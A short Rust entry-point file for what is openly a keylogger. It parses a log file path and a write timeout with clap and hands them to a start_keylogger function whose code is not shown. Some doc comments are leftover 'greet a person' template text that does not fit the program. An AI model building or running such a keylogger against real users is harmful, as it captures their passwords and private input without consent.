mod lib;

use clap::Parser;

/// Simple program to greet a person
#[derive(Parser, Debug)]
#[clap(author, version, about, long_about = None)]
struct Args {
    // File to store keystrokes in.
    #[clap(short, long)]
    logfile: String,
    // Number of seconds to wait after typing stops to write keystrokes to disk.
    #[clap(short, long)]
    timeout: u64,

    /// Number of times to greet
    #[clap(short, long, default_value_t = 1)]
    count: u8,
}

fn main() {
    let args = Args::parse();
    let _res = lib::start_keylogger(args.logfile, args.timeout);
}